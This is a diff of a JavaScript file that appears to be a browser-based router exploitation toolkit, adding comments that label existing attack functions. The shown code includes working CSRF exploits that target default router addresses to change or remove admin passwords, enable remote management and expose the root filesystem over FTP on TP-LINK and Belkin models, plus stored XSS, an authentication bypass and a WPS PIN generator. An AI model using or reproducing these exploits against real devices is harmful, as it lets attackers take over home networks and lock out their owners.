@@ -2228,7 +2228,7 @@ function DIR865L(ip){
 	document.location="http://"+ip+"/router_info.xml?section="+loca;
 }
 
-
+// TP-LINK WR1043ND enable root filsystem on FTP CSRF
 function WR1043ND(ip){
 	ip = ip || "192.168.0.1";
 	alert("Making Root FS Accessible to FTP");
@@ -2243,6 +2243,7 @@ function WR1043ND(ip){
 	img1.src="http://"+ip+"/userRpm/NasFtpCfgRpm.htm?startFtp=1";
 }
 
+// Belkin N900 Change admin creds &amp; enable remote MGMT CSRF
 function N900_csrf(ip){
 	ip = ip || "192.168.2.1";
 form = '<input name="page" value="util_system"/>\
@@ -2262,6 +2263,7 @@ form = '<input name="page" value="util_system"/>\
 	post('http://' + ip + '/util_system.html', form);
 }
 
+// Belkin F5D8236-4v2 enable remote MGMT CSRF
 function F5D8236_4v2_csrf_admin(ip){
 	ip = ip || "192.168.2.1";
 	form = '<input type="hidden" name="remote_mgmt_enabled" value="1"/>\
@@ -2270,7 +2272,7 @@ function F5D8236_4v2_csrf_admin(ip){
 	post('http://' + ip + '/cgi bin/system_setting.exe', form);
 }
 
-
+// Belkin N300 remove admin password &amp; enable remote MGMT CSRF
 function N300_csrf_admin(ip){
 	ip = ip || "192.168.2.1";
 	form = '<input type="hidden" name="location_page" value="system.stm"/>\
@@ -2304,8 +2306,6 @@ function zoomX_newadmin(ip)
     httpGet(urlv1);
     httpGet(urlv2);
 }
-
-
 
 // Alcatel Lucent I-240W-Q Authentication Bypass - js by sinnet3000
 function i230w_auth(ip)
@@ -2343,6 +2343,7 @@ function i240w_command(ip)
 	post('http://' + ip + '/GponForm/diag_XForm', form);
 }
 
+// Belkin N900 psk stored cross site scripting
 function N900_xss_psk(ip)
 {
 	ip = ip || "192.168.2.1";
@@ -2354,6 +2355,7 @@ function N900_xss_psk(ip)
 	post('http://' + ip + '	/wl_guest.html', form);
 }
 
+// Belkin N900 ssid stored cross site scripting
 function N900_xss_ssid(ip)
 {
 	ip = ip || "192.168.2.1";
@@ -2419,6 +2421,7 @@ function ComputeChecksum(s){
 	return (10 - digit) % 10
 }
 
+// Arris DG860A WPS PIN Generator
 function F(n)
 {
 if (n==1 || n==2 || n==0){
@@ -2427,7 +2430,6 @@ if (n==1 || n==2 || n==0){
       return F(n-1) + F(n-2);
     }
 }
-
 function FibGen(num){
 	return F(num);
 }
@@ -2555,6 +2557,7 @@ function rtg32xss(ip)
 		document.rt632xssf.submit();
 	}
 }
+
 // ASUS RT-G32 CSRF exploit (C) 2015 MustLive. http://websecurity.com.ua
 function rt632csrfx(ip)
 {
